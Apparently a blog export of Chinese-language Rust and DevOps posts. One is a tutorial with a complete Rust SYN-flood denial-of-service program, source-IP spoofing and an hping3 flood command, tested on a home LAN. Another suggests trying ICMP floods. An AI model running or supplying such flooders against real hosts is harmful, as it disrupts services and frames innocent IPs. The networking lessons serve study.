类似的设计在很多用户友好的软件中都有体现了，下图是 Blender 的操作界面\nlayout 系统 Zellij 设计了一个 layout 系统， 用户可以设置不同的配置文件（kdl 格式）https://kdl.dev/\nkdl 确实很适合描述复杂的配置，类似 ron https://github.com/ron-rs/ron\n我测试了几个 layout 配置以及运行效果如下：\nmonitor.kdl\n1 2 3 4 5 6 7 layout { pane split_direction=\u0026#34;vertical\u0026#34; { pane command=\u0026#34;htop\u0026#34; // panes can have arguments on the same line pane command=\u0026#34;btm\u0026#34; } pane command=\u0026#34;nu\u0026#34; } cargo.kdl\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 layout { pane split_direction=\u0026#34;vertical\u0026#34; size=\u0026#34;60%\u0026#34; { pane edit=\u0026#34;src/main.rs\u0026#34; pane edit=\u0026#34;Cargo.toml\u0026#34; } pane split_direction=\u0026#34;vertical\u0026#34; size=\u0026#34;40%\u0026#34; { pane command=\u0026#34;cargo\u0026#34; { args \u0026#34;run\u0026#34; focus true } pane command=\u0026#34;cargo\u0026#34; { args \u0026#34;test\u0026#34; } } } 第一个是显示一个监控的界面，第二个是跑 rust 项目， 其中 cargo run 和 cargo test 的 pane 官方的名词是 Command Panes 就是这个 pane 可以通过按键 Enter 重复的执行。 确实可以方便的完成一些集成的工作。\n更多 layout 文档： https://zellij.dev/documentation/creating-a-layout.html\n插件系统 Zellij 的插件系统使用 wasm 集成， 这个方式我之前在自己的系统里面也研究过，但是最终没有选用， 那时候 rust wasm 的库还不算太丰富， 从 zellij 来看，似乎已经很不错了， 使用 wasm 对于系统设计有不少好处，如果直接用 ffi 各种语言绑定会有比较多的工作要做，使用 wasm 有不少好处，插件分发和加载处理将简单很多，因为只有 wasm 一个 taget ，不然还要处理不同系统的库的加载。 第三方语言绑定也会简单不少。\n官方有 rust 和 zig 的示例：https://zellij.dev/documentation/plugin-writing.html\nrust 的绑定库： https://github.com/zellij-org/zellij/tree/main/zellij-tile zig 的绑定库：https://mzte.de/git/LordMZTE/zellzig 代码都很简单易读，很适合学习。\n注意：目前 zellij 的插件 api 系统还未稳定，相关接口未来可能会发生变化。\nZellij 用到的 rust 库 最后简单罗列几个 zellij 中用到的一些库，将来大家的项目总可能也会用得到，当然 zellij 是一个终端应用，所用到的库基本也是终端应用相关的库。\nclap , 大名鼎鼎的 clap ，命令行参数解析, zellij 中用的是 3.x 的版本，还未升级到 4\nwasmer , wasm 宿主， 插件系统使用它实现\n","date":"2023-01-23T21:44:12+08:00","image":"https://liangdi.me/p/rust-project-review-zellij/assets/rust-zellij-s_hu341624f79a40f1cfc3278c9b5ae37d99_57054_120x120_fill_box_smart1_3.png","permalink":"https://liangdi.me/p/rust-project-review-zellij/","title":"Rust 项目鉴赏: zellij 替代 screen, tmux 的终端工具"},{"content":"概述 DDoS 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/what-is-a-ddos-attack/\n如果黑客攻击技术有层次之分, 那么 DDoS 攻击可以比喻为: 花钱请了一堆打手,攻击目标, 没有什么技术含量又有效果,目标也要付出不少成本才能防护的了.\n那 Rust 能编写 DDoS 软件吗? 答案当然是可以的,基本上所有语言都可以编写.\nDDoS 工具说到底就是充分利用了网络协议的标准, 然后不讲道理恶意利用而以. 第一个 D, distributed , 分布式, 就不在我们今天内容的范畴了, 后面将结合其他内容一起写.\nDDoS 攻击大多数发生在 3,4,7 层网络, SYN Flood 就是在 TCP 协议上实现的.\nSYN Flood 原理 SYN Flood 介绍: https://www.cloudflare.com/zh-cn/learning/ddos/syn-flood-ddos-attack/\nSYN 洪水攻击主要是利用 TCP 协议握手规则, 大致就是不停的只伸手, 就不和对方握手,导致对方一直准备着和你握手, 就没法完成其他正常的握手动作了.\n那丛技术实现原理来看, 就是不停的构建 TCP-SYN 数据包,发给目标 IP 地址, 对于目标响应的 SYN/ACK 信息不做处理, 甚至是伪造发送端 IP ,使得目标将响应的 SYN/ACK 发送到其他 IP 地址去.\n准备工作 还是使用 pnet 库 (基于 pcap) 尝试伪造 IP (伪造 IP 对于公网 ISP 服务商基本都限制了,可以在内网实现). TCP 协议就不展开讲了. 编码实现 创建项目, 并且添加基本以来 cargo add 的功能来自 cargo-edit 这个项目, 如果系统没有,可以使用 cargo install cargo-edit 安装该功能\n1 2 3 4 5 6 7 cargo new syn-flood-demo cd syn-flood-demo cargo add pnet cargo add pnet_transport cargo add rand cargo add anyhow cargo add clap -F derive Demo 代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 use std::net::Ipv4Addr; use clap::Parser; use pnet::{packet::{tcp::{TcpPacket, MutableTcpPacket, TcpFlags, ipv4_checksum, TcpOption}, ipv4::{MutableIpv4Packet, checksum, Ipv4Flags}, ip::IpNextHeaderProtocols}, }; use pnet_transport::transport_channel; use pnet_transport::TransportChannelType::Layer3; use rand::{random, thread_rng, Rng}; #[derive(Parser, Debug)] #[clap(author, version, about, long_about = None)] struct Args { #[clap(short, long)] target:String, #[clap(short, long)] source:String, #[clap(short, long)] port:u32, #[clap(short, long)] count:u32 } const IPV4_HEADER_LEN: usize = 20; const TCP_HEADER_LEN: usize = 32; const TEST_DATA_LEN: usize = 1024; fn main() { let args = Args::parse(); println!(\u0026#34;args:{:?}\u0026#34;,args); // 选择 3 层 IPv4 协议, 构建发送器 let protocol = Layer3(IpNextHeaderProtocols::Ipv4); let(mut tx, _) = match transport_channel(64,protocol) { Ok(( tx, rx)) =\u0026gt; (tx,rx), Err(e) =\u0026gt; panic!(\u0026#34;Error happened {}\u0026#34;, e), }; let target: Ipv4Addr = args.target.clone().parse().unwrap(); // 根据 --count -c 这个参数设置发送的数据包数量 // TODO 可以改成多线程发送,性能能再提高 for _ in 0..args.count { // 构建数据包 let mut packet = [0u8; IPV4_HEADER_LEN + TCP_HEADER_LEN + TEST_DATA_LEN]; let packet = build_packet(args.source.clone(), args.target.clone(), args.port, \u0026amp;mut packet[..]); //println!(\u0026#34;packet:{:#?}\u0026#34;,packet); // 发送数据包到目标地址 tx.send_to(packet,std::net::IpAddr::V4(target)); } } fn build_packet(source:String,target:String,port:u32,packet: \u0026amp;mut [u8]) -\u0026gt; TcpPacket{ // Set data packet[IPV4_HEADER_LEN + TCP_HEADER_LEN] = \u0026#39;t\u0026#39; as u8; packet[IPV4_HEADER_LEN + TCP_HEADER_LEN + 1] = \u0026#39;e\u0026#39; as u8; packet[IPV4_HEADER_LEN + TCP_HEADER_LEN + 2] = \u0026#39;s\u0026#39; as u8; packet[IPV4_HEADER_LEN + TCP_HEADER_LEN + 3] = \u0026#39;t\u0026#39; as u8;情况 let ipv4_source: Ipv4Addr = source.parse().unwrap(); let ipv4_destination:Ipv4Addr = target.parse().unwrap(); { let len = packet.len(); let mut ip_header = MutableIpv4Packet::new(\u0026amp;mut packet[..]).unwrap(); ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp); ip_header.set_source(ipv4_source); ip_header.set_flags(Ipv4Flags::DontFragment); ip_header.set_destination(ipv4_destination); ip_header.set_ttl(128); ip_header.set_version(4); ip_header.set_header_length(5); let checksum = checksum(\u0026amp;ip_header.to_immutable()); ip_header.set_checksum(checksum); } let mut rng = thread_rng(); let mut tcp_header = MutableTcpPacket::new(\u0026amp;mut packet[IPV4_HEADER_LEN..]).unwrap(); tcp_header.set_source(rng.gen_range(1000..5000)); tcp_header.set_destination(port as u16); tcp_header.set_sequence(random::\u0026lt;u32\u0026gt;()); tcp_header.set_flags(TcpFlags::SYN); tcp_header.set_window(rng.gen_range(1000..5000)); tcp_header.set_data_offset(8); tcp_header.set_urgent_ptr(0); tcp_header.set_options(\u0026amp;[TcpOption::mss(1460), TcpOption::sack_perm(), TcpOption::nop(), TcpOption::nop(), TcpOption::wscale(7)]); let checksum = ipv4_checksum(\u0026amp;tcp_header.to_immutable(), \u0026amp;ipv4_source, \u0026amp;ipv4_destination); tcp_header.set_checksum(checksum); TcpPacket::new(\u0026amp;mut packet[..]).unwrap() } 测试 我们准备了三只鸡, 用我们的攻击鸡去攻击出头鸡,然后嫁祸给躺枪鸡\n攻击鸡(Linux, IP:192.168.31.245) 出头鸡(Win 10, IP:192.168.31.19) 躺枪鸡(Linux, IP:192.168.31.102) 在出头鸡上安装一个 http 服务器,监听 8000 端口, 如果不开一个应用, 来自攻击鸡的流量还是会传输到出头鸡,但是不会有后续 SYN ACK 的数据包.\n攻击鸡(192.168.31.245) 1 2 3 4 5 6 7 8 9 cargo build # 我的程序有四个参数 -t 是目标 ip -s 是源 ip , 这里局域网可以伪造 -p 目标端口 -c 数据包数量 sudo ./target/debug/syn-flood-demo -s 192.168.31.102 -t 192.168.31.19 -p 8000 -c 1000000 # 上面这个命令在我们的攻击鸡中执行,功能就是向 192.168.31.19, 8000 端口, 发送 1000000 个数据包, 并且伪造 ip: 192.168.31.102 出头鸡(192.168.31.19) 在出头鸡上,我们抓包查看以及看一下系统资源情况\n空闲情况 demo 攻击 hping3 攻击 1 2 #hping3 攻击命令 sudo hping3 -i u1 -S -d 1024 -p 8080 192.168.31.19 躺枪鸡 躺枪鸡中使用 wireshark 监听到了出头鸡 发过来的 SYN ACK 数据包.\n补充 测试中我们的 demo 程序攻击有 30Mbps 左右的流量, cpu 波动 10% 左右, hping3 攻击的流量平均 37Mbps 左右, 这个流量受到 WIFI 环境影响很大,比如干扰,路由器不稳定等, 写文档之前, 我用 demo 测试可以达到 90Mbps 左右, hping3 则有 170Mbps 左右, 这个应该是正常的,我们的程序只是单线程, 还有提升的空间, 只是写文档时候测试达不到那个速率. 虽然 cpu 只有 10% 的波动, 但是在 出头鸡 做一些 io 的操作,键盘输入, 传建文件什么的相当的卡顿. 攻击不仅消耗目标的流量,而且对 io 操作影响也很大. 小结 简单的 syn flood , 可以继续改进, 支持数据包大小等,目前发送 1024字节的 payload. 外网的 IP 伪装是需要特定条件的. 现在 ISP 基本都控制了. demo 可以升级为多线程的. syn 数据包不仅可以用来 DDoS 攻击, 还可以用于端口扫描, 如果发送 SYN , 接收到了 SYN ACK, 则是端口开放,如果没有收到数据包或者收到 RST ACK 则是端口关闭. ","date":"2022-06-03T16:01:32+08:00","image":"https://liangdi.me/p/rust-hacking-programing-syn-flood-ddos/assets/rust-syn-flood_hu3ef4952130487b1cfcbb0e783be9d119_46853_120x120_fill_box_smart1_3.png","permalink":"https://liangdi.me/p/rust-hacking-programing-syn-flood-ddos/","title":"Rust 黑客编程 - SYN Flood 敲开 DDoS 的大门"},{"content":"概述 记得在高中时期打开终端, ping 一个 IP ,这个操作在别人面前就会引来仰望大神的目光.\n后来知道了底层是 ICMP 协议,然后就没有然后了, 仅停留在知道的层面, 入坑 Rust 以来,也没有什么特别的项目去做, 就从这方面入手,重温一下高中时期学习\u0026quot;黑客\u0026quot;技术时的热情,毕竟兴趣是最好的老师!\n准备工作 Rust 网络操作的库,不算很多, 这里使用 pnet 这个库,基于 pcap.\n测试抓包工具使用 wireshark\n预备知识 Wiki 参考: https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E6%8E%A7%E5%88%B6%E6%B6%88%E6%81%AF%E5%8D%8F%E8%AE%AE ICMP 协议属于 3 层网络, 包含在 IP 数据包中, 所以我们要构建的数据包格式: IP头部|ICMP头部|ICMP数据 ICMP 报文使用 Type 和 Code 的组合区分不同的类型 根据 Wiki 的说明, 程序将使用 Type = 0 的数据包(Echo Reply) 和 Type = 8 的数据包 (Echo Request) 这里我们使用 IPv4 协议\n实现思路 pnet 可以实现 2,3,4 层的数据包操作 pnet 提供了各层数据包的协议的封装 在此应用中,可以使用 transport_channel 创建网络的通讯通道,使用其 rx 接收数据包, tx 发送数据包. 编码实现 创建项目, 并且添加基本以来 cargo add 的功能来自 cargo-edit 这个项目, 如果系统没有,可以使用 cargo install cargo-edit 安装该功能\n1 2 3 4 5 6 cargo new icmp-demo cd icmp-demo cargo add pnet cargo add pnet_transport cargo add rand cargo add anyhow Demo 代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 use std::{net::{IpAddr}, time::{Instant, Duration}, sync::{Arc, RwLock}, env}; use pnet::packet::{ip::{IpNextHeaderProtocols,}, icmp::{IcmpTypes, echo_request::{IcmpCodes, MutableEchoRequestPacket}, echo_reply::EchoReplyPacket}, util, Packet}; use pnet_transport::{transport_channel, TransportProtocol}; use pnet_transport::TransportChannelType::Layer4; use pnet_transport::{icmp_packet_iter}; use rand::random; const ICMP_SIZE:usize = 64; fn main() -\u0026gt; anyhow::Result\u0026lt;()\u0026gt;{ let args: Vec\u0026lt;String\u0026gt; = env::args().collect(); if(args.len() \u0026lt; 2) { panic!(\u0026#34;Usage: icmp-demo target_ip\u0026#34;); } let target_ip:IpAddr = args[1].parse().unwrap(); println!(\u0026#34;icpm echo request to target ip:{:#?}\u0026#34;,target_ip); // 确定协议 并且创建数据包通道 tx 为发送通道, rx 为接收通道 let protocol = Layer4(TransportProtocol::Ipv4(IpNextHeaderProtocols::Icmp)); let (mut tx, mut rx) = match transport_channel(4096, protocol) { Ok((tx, rx)) =\u0026gt; (tx, rx), Err(e) =\u0026gt; return Err(e.into()), }; // 将 rx 接收到的数据包传化为 iterator let mut iter = icmp_packet_iter(\u0026amp;mut rx); loop { let mut icmp_header:[u8;ICMP_SIZE] = [0;ICMP_SIZE]; let icmp_packet = create_icmp_packet(\u0026amp;mut icmp_header); // println!(\u0026#34;icmp_packet:{:?}\u0026#34;,icmp_packet); let timer = Arc::new(RwLock::new(Instant::now())); // 发送 ICMP 数据包 tx.send_to(icmp_packet, target_ip)?; match iter.next() { // 匹配 EchoReplyPacket 数据包 Ok((packet, addr)) =\u0026gt; match EchoReplyPacket::new(packet.packet()) { Some(echo_reply) =\u0026gt; { if packet.get_icmp_type() == IcmpTypes::EchoReply { let start_time = timer.read().unwrap(); //let identifier = echo_reply.get_identifier(); //let sequence_number = echo_reply.get_sequence_number(); let rtt = Instant::now().duration_since(*start_time); println!( \u0026#34;ICMP EchoReply received from {:?}: {:?} , Time:{:?}\u0026#34;, addr, packet.get_icmp_type(), rtt ); } else { println!( \u0026#34;ICMP type other than reply (0) received from {:?}: {:?}\u0026#34;, addr, packet.get_icmp_type() ); } } None =\u0026gt; {} }, Err(e) =\u0026gt; { println!(\u0026#34;An error occurred while reading: {}\u0026#34;, e); } } std::thread::sleep(Duration::from_millis(500)); } Ok(()) } /** * 创建 icmp EchoRequest 数据包 */ fn create_icmp_packet\u0026lt;\u0026#39;a\u0026gt;(icmp_header: \u0026amp;\u0026#39;a mut [u8]) -\u0026gt; MutableEchoRequestPacket\u0026lt;\u0026#39;a\u0026gt; { let mut icmp_packet = MutableEchoRequestPacket::new(icmp_header).unwrap(); icmp_packet.set_icmp_type(IcmpTypes::EchoRequest); icmp_packet.set_icmp_code(IcmpCodes::NoCode); icmp_packet.set_identifier(random::\u0026lt;u16\u0026gt;()); icmp_packet.set_sequence_number(1); let checksum = util::checksum(icmp_packet.packet(), 1); icmp_packet.set_checksum(checksum); icmp_packet } 测试\n1 2 3 cargo build # 由于使用了 pcap 需要 root 权限 sudo ./target/debug/icmp-demo 114.114.114.114 运行结果\n1 2 3 4 5 6 7 8 9 10 [liangdi@liangdi-x395 icmp-demo]$ sudo ./target/debug/icmp-demo 114.114.114.114 icpm echo request to target ip:114.114.114.114 ICMP EchoReply received from 114.114.114.114: IcmpType(0) , Time:14.525838ms ICMP EchoReply received from 114.114.114.114: IcmpType(0) , Time:9.570341ms ICMP EchoReply received from 114.114.114.114: IcmpType(0) , Time:11.355756ms ICMP EchoReply received from 114.114.114.114: IcmpType(0) , Time:12.618713ms ICMP EchoReply received from 114.114.114.114: IcmpType(0) , Time:15.448623ms ICMP EchoReply received from 114.114.114.114: IcmpType(0) , Time:11.289961ms ICMP EchoReply received from 114.114.114.114: IcmpType(0) , Time:11.169053ms ICMP EchoReply received from 114.114.114.114: IcmpType(0) , Time:13.064115ms wireshark 中的结果(wireshark 可以直接使用 icmp 这个过滤器过滤数据包)\n如果做以下测试,结果会是另外一种景象\n1 sudo ./target/debug/icmp-demo 127.0.0.1 输出结果:\n1 2 3 4 5 6 7 8 9 10 11 12 [liangdi@liangdi-x395 icmp-demo]$ sudo ./target/debug/icmp-demo 127.0.0.1 icpm echo request to target ip:127.0.0.1 ICMP type other than reply (0) received from 127.0.0.1: IcmpType(8) ICMP EchoReply received from 127.0.0.1: IcmpType(0) , Time:72.817µs ICMP type other than reply (0) received from 127.0.0.1: IcmpType(8) ICMP EchoReply received from 127.0.0.1: IcmpType(0) , Time:75.443µs ICMP type other than reply (0) received from 127.0.0.1: IcmpType(8) ICMP EchoReply received from 127.0.0.1: IcmpType(0) , Time:77.316µs ICMP type other than reply (0) received from 127.0.0.1: IcmpType(8) ICMP EchoReply received from 127.0.0.1: IcmpType(0) , Time:79.861µs ICMP type other than reply (0) received from 127.0.0.1: IcmpType(8) ICMP EchoReply received from 127.0.0.1: IcmpType(0) , Time:78.057µs 可以看到输出了 IcmpType(8) 的数据包, 这就是 EchoRequest 的类型, 由于我们监听了本地的数据包接收通道,所以发往 127.0.0.1 的数据包也被解析了.\n小结 Demo 简单的实现了 icmp echo request 的请求和回显功能, 相比 ping 的功能还相差很多, 不过基本了解了 pnet 这个包的使用方式,以及了解了 ICMP 协议的基本用法, 进阶使用就留给大家思考,其中一些想法会在后续文章中再去实现.\nping 命令有很多参数, 比如设置 icmp 数据包大小 , 请求次数等, 这些可以进阶去实现. ping 可以直接解析域名, demo 中为做处理, 所以无法直接使用域名. demo 中使用 Layer4 层发送数据包,所以隐藏了 IP 层的信息, 可以使用 Layer3 层发送,然后就可以自己构造 IP 头, 实现诸如 IP 伪装等功能. ICMP 可以发送一定的 payload ,所以 icmp flood 怎么实现? Ping of death (古老的漏洞) 怎么实现? ","date":"2022-06-02T19:30:20+08:00","image":"https://liangdi.me/p/rust-hacking-programing-icmp-ping/assets/rust-icmp_hu800d78222c26c310e1cb900728e26c37_48411_120x120_fill_box_smart1_3.png","permalink":"https://liangdi.me/p/rust-hacking-programing-icmp-ping/","title":"Rust 黑客编程 - ICMP 协议 ping 的简单实现"},{"content":"前言 今天看到 WordPress 6 发布了,回想多年以前在使用 WordPress 的时候,一顿 yum 命令安装 nginx, php, mysql, php-fpm , 然后再配置 nginx, 经过一阵子配置, WordPress 就运行成功了, 如今在云原生时代, 可以用 k8s , docker , Podman 等工具来安装这些系统了, 今天就使用 Podman 安装 WordPress , 人生苦短, 我用 podman !\n认知准备 这次是安装一个业务系统(WordPress) , 所以不象一些 hello world 的文章, 更多要关注底层的一些东西 网络(network): WordPress 要和 mysql 连接, 所以需要网络支持 数据卷(volume): mysql 数据要保存, WordPress 的文章数据保存在数据库中,但是插件/主题,上传图片等都是保存在文件系统中, 文件系统的内容要保存下来, 就要使用到数据卷功能. 使用 Podman 4.1.0 版本 安装过程 网络 使用 podman network ls , 可以查看 Podman 的网络列表, 默认会有一个 Podman 的网络, 这里我们会创建一个新的网络叫做 wp-net , 使用如下命令:\n1 2 3 podman network create wp-net # 使用 podman network inspect 命令查看网络信息 podman network inspect wp-net 输出内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 { \u0026#34;name\u0026#34;: \u0026#34;wp-net\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;a47201502d7f6450e7fda6c1ce7e449418350cb2b668feca2cf7d5048cb336cc\u0026#34;, \u0026#34;driver\u0026#34;: \u0026#34;bridge\u0026#34;, \u0026#34;network_interface\u0026#34;: \u0026#34;cni-podman2\u0026#34;, \u0026#34;created\u0026#34;: \u0026#34;2022-06-02T10:45:05.864113967+08:00\u0026#34;, \u0026#34;subnets\u0026#34;: [ { \u0026#34;subnet\u0026#34;: \u0026#34;10.89.1.0/24\u0026#34;, \u0026#34;gateway\u0026#34;: \u0026#34;10.89.1.1\u0026#34; } ], \u0026#34;ipv6_enabled\u0026#34;: false, \u0026#34;internal\u0026#34;: false, \u0026#34;dns_enabled\u0026#34;: true, \u0026#34;ipam_options\u0026#34;: { \u0026#34;driver\u0026#34;: \u0026#34;host-local\u0026#34; } } ] MySQL 创建好 wp-net, 后,我们创建 mysql 容器,并且把它加入到 wp-net 中 , 命令如下:\n1 2 3 4 5 6 7 8 # 创建存放 mysql 数据的临时目录 mkdir -p /tmp/mysql-data podman run --name mysql \\ --net wp-net \\ -e MYSQL_ROOT_PASSWORD=my-password \\ -v /tmp/mysql-data:/var/lib/mysql \\ -d docker.io/library/mysql:8 说明:\n\u0026ndash;net wp-net 参数就是把创建的 mysql 容器加入到 wp-net 这个网络中, 并且使用 \u0026ndash;name mysql , 这样网络中的其他容器就能使用 mysql 这个网络名,解析出 mysql 容器的 ip 了, 也可以使用 \u0026ndash;hostname 参数来指定网络主机名. -e MYSQL_ROOT_PASSWORD 设定 mysql root 密码 -v /tmp/mysql-data:/var/lib/mysql 将主机的 /tmp/mysql-data 目录映射到容器中 /var/lib/mysq 目录, 这就是数据卷(volume) 的功能,这样数据就可以保存到主机中,这里在 tmp 目录创建方便临时测试,volume 功能也可以使用 podman volume 命令创建命名的数据卷. 这里没有使用 -p 3306:3306 类似的端口映射参数,因为我们 host 不需要去访问 mysql ,容器网络中访问不需要映射端口. 创建好 mysql 容器后可以使用以下命令做些检查\n1 2 3 4 5 # 使用 ps 命令可以查看运行中的容器, 这里应该可以看到 mysql 容器 podman ps # 使用 exec 命令可以运行容器中的程序, 这里运行 bash ,就可以进入容器的 bash 中运行其他命令了. podman exec -it mysql bash Wordpress mysql 容器运行后,就可以去创建 WordPress 了, WordPress 镜像的详细信息可以去 docker hub 去看: https://hub.docker.com/_/wordpress\nWordPress 中会用到的配置主要是: 数据连接信息, 可变的内容主要是 wp-conent 目录下的主题/插件,上传文件信息, 如果你不去使用环境变量配置数据库信息, 那么动态配置的 wp-config.php 也是可变的.\n运行 WordPress 的容器命令如下:\n1 2 3 4 5 # 我们先用最简单的命令运行 wordpress 容器, 尽快见一下久违的 wordpress podman run --name wordpress \\ --net wp-net \\ -p 8080:80 \\ -d docker.io/library/wordpress:6 创建好后, 我们就可以访问 http://localhost:8080/ 我见证 WordPress 的安装了, 因为没有配置数据库信息,所以 WordPress 进入了数据库配置页面: 这里 database host 只需要填写 mysql 即可, 容器中会自动解析 mysql 容器的 ip.\nWordPress 不会主动去创建数据库,所以我们需要进入 mysql 容器去创建一个 wordpress 的数据库. 命令如下:\n1 2 3 4 5 6 7 8 9 # 进入容器 podman exec -it mysql bash # 使用 root 密码 my-password 登陆数据库 mysql -u root -p # 创建数据库 create database `wordpress`; #完成后就可以退出了,继续下一步安装 wordpress 到此, WordPress 6 测试安装完成了.\n上面创建的 WordPress 容器没有使用数据卷功能, 那么如果你上传了一些图片信息,安装了一些插件,这些内容都保存在容器里面,如果有一天容器被删除了,也就没有了,我们现在重新创建这个 wordpress 容器,并且使用数据卷功能,将可变的目录映射到 host 中.\n先删除现有的 wordpress 容器\n1 podman rm -f wordpress 1 2 3 4 5 6 7 8 9 10 11 12 13 # 创建用于测试的临时目录 mkdir -p /tmp/wordpress/wp-content podman run --name wordpress \\ --net wp-net \\ -p 8080:80 \\ -v /tmp/wordpress/wp-content:/var/www/html/wp-content/ \\ -e WORDPRESS_DB_HOST=mysql \\ -e WORDPRESS_DB_USER=root \\ -e WORDPRESS_DB_PASSWORD=my-password \\ -e WORDPRESS_DB_NAME=wordpress \\ -e WORDPRESS_TABLE_PREFIX=wp_ \\ -d docker.io/library/wordpress:6 现在我们去看 /tmp/wordpress/wp-content 目录, 可以看到已经有相关目录出现在其中了,这样容器即使被销毁,这些数据也是保存在 host 中了. 总结 5-10 分钟就将 WordPress 安装好了, 基本不需要去做系统配置(nginx,php,mysql). 这正式容器技术带来的便利.\n文章中使用了 Podman 的基本功能, 有以下方面需要注意\nPodman 容器默认不会跟随系统启动, 需要配合 systemd 服务启动, 具体可以查看 https://docs.podman.io/en/latest/markdown/podman-generate-systemd.1.html 数据卷(volume) 更多功能使用 podman volume \u0026ndash;help 命令查看, 可以配置 nfs 的 volume 等. 应用和数据库组合的容器组可以使用 podman-comose 实现, 也可以使用 Podman 的 pod 功能实现,具体查看官方文档. ","date":"2022-06-02T12:37:58+08:00","image":"https://liangdi.me/p/run-wordpress-6-arturo-with-podman/assets/podman-wordpress_hu26d914e965d24c838e4aef4a305c3a00_65209_120x120_fill_box_smart1_3.png","permalink":"https://liangdi.me/p/run-wordpress-6-arturo-with-podman/","title":"使用 Podman 运行 WordPress 6 Arturo"},{"content":"前言 看到标题,是不是觉得我疯了,爬虫,这个时间点应该还轮不到 rust 吧!\n确实,现在成熟的爬虫技术基本使用 python, java 等,那么这篇文章的用意是什么呢? 我先来交代一下背景, 2017 年,我挖了一个坑: https://zhuanlan.zhihu.com/p/24900305\n这个项目后来商用了,所以就不方便继续更新, 到了现在 2022 年了, 各种技术已经迭代了好多次, 那么,我也要重新思考一下一套新的爬虫架构了,这套架构基于云原生,容器化,结合不同语言取长补短,相互配合,简单概括如下:\n爬虫节点容器运行,语言无关,所以会支持 python ,java 等各语言开发的爬虫 统一的 DAG 任务分发调度节点 统一的数据集接口 其中一点是爬虫语言无关,所以会设计统一的输入输出接口,让各语言编写的程序都能在容器中执行, python, java, golang 的爬虫生态都很不错了,文章也很多, rust 这方面比较少,所以这里就写一篇 rust 的文章.\n爬虫底层关注的技术点 http 库 html 解析 json 解析 WebDriver 集成 http 库 作为爬虫的 http 库, 只要支持 http 协议基本就 ok, 主要是设置 header, 设置 cookies, 设置代理等等.\nrust 的 http 库列表 https://lib.rs/web-programming/http-client\n这里使用 reqwest 做个简单的示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 use reqwest; use http::{HeaderMap, HeaderValue, header::{COOKIE,USER_AGENT}}; #[tokio::main] async fn main() -\u0026gt; Result\u0026lt;(),reqwest::Error\u0026gt; { // HTML let url = \u0026#34;https://ssr1.scrape.center/\u0026#34;; let resp = reqwest::get(url).await?; println!(\u0026#34;Response: {:?} {}\u0026#34;, resp.version(), resp.status()); println!(\u0026#34;Headers: {:#?}\\n\u0026#34;, resp.headers()); //println!(\u0026#34;Body:{:#?}\u0026#34;,resp.text().await?); // JSON let url = \u0026#34;https://spa1.scrape.center/api/movie/?limit=10\u0026amp;offset=0\u0026#34;; let resp = reqwest::get(url).await?; let json_body:serde_json::Value = resp.json().await?; println!(\u0026#34;Json:{:#?}\u0026#34;,json_body); // POST let _resp = reqwest::Client::new() .post(url) .form(\u0026amp;[(\u0026#34;name\u0026#34;, \u0026#34;value\u0026#34;)]) .send() .await; // Header let _resp = reqwest::Client::new() .post(url) .header(\u0026#34;Auth\u0026#34;,\u0026#34;xxx\u0026#34;) .send() .await; // UserAgent Cookies let client = reqwest::Client::builder() .cookie_store(true).build().unwrap(); let mut headers = HeaderMap::new(); headers.insert(COOKIE, HeaderValue::from_str(\u0026#34;key=value\u0026#34;).unwrap()); headers.insert(USER_AGENT,HeaderValue::from_str(\u0026#34;my user-agent\u0026#34;).unwrap()); let _reps = client.get(url) .headers(headers) .send() .await?; Ok(()) } Cargo.toml\n1 2 3 4 5 [dependencies] http = \u0026#34;0.2.7\u0026#34; reqwest = {version = \u0026#34;0.11.10\u0026#34;,features = [\u0026#34;json\u0026#34;,\u0026#34;cookies\u0026#34;] } serde_json = \u0026#34;1.0.81\u0026#34; tokio = {version =\u0026#34;1.18.2\u0026#34;,features = [\u0026#34;full\u0026#34;] } html/json 解析 采集到 html 和 json 数据后,需要解析出有用的数据, html 内容主要用 css 选择器筛选, json 可以转 map 或者使用 jsonpath 筛选, 这里使用 scraper 和 jsonpath 这两个库做个简单示例.\nCargo\n1 2 cargo add scraper cargo add jsonpath 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 use reqwest; use scraper::{Html, Selector}; #[tokio::main] async fn main() -\u0026gt; Result\u0026lt;(),reqwest::Error\u0026gt; { // HTML let url = \u0026#34;https://ssr1.scrape.center/\u0026#34;; let resp = reqwest::get(url).await?; //println!(\u0026#34;Body:{:#?}\u0026#34;,resp.text().await?); let body = resp.text().await?; let doc = Html::parse_fragment(\u0026amp;body); let selector = Selector::parse(\u0026#34;.m-b-sm\u0026#34;).unwrap(); for el in doc.select(\u0026amp;selector) { println!(\u0026#34;title:{}\u0026#34;,el.inner_html()); } // JSON let url = \u0026#34;https://spa1.scrape.center/api/movie/?limit=10\u0026amp;offset=0\u0026#34;; let resp = reqwest::get(url).await?; let json_body:serde_json::Value = resp.json().await?; //println!(\u0026#34;Json:{:#?}\u0026#34;,json_body); let json_sel = jsonpath::Selector::new(\u0026#34;$.results.*.name\u0026#34;).unwrap(); for json_el in json_sel.find(\u0026amp;json_body) { println!(\u0026#34;json title:{}\u0026#34;,json_el.as_str().unwrap()); } Ok(()) } 运行结果\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 title:霸王别姬 - Farewell My Concubine title:这个杀手不太冷 - Léon title:肖申克的救赎 - The Shawshank Redemption title:泰坦尼克号 - Titanic title:罗马假日 - Roman Holiday 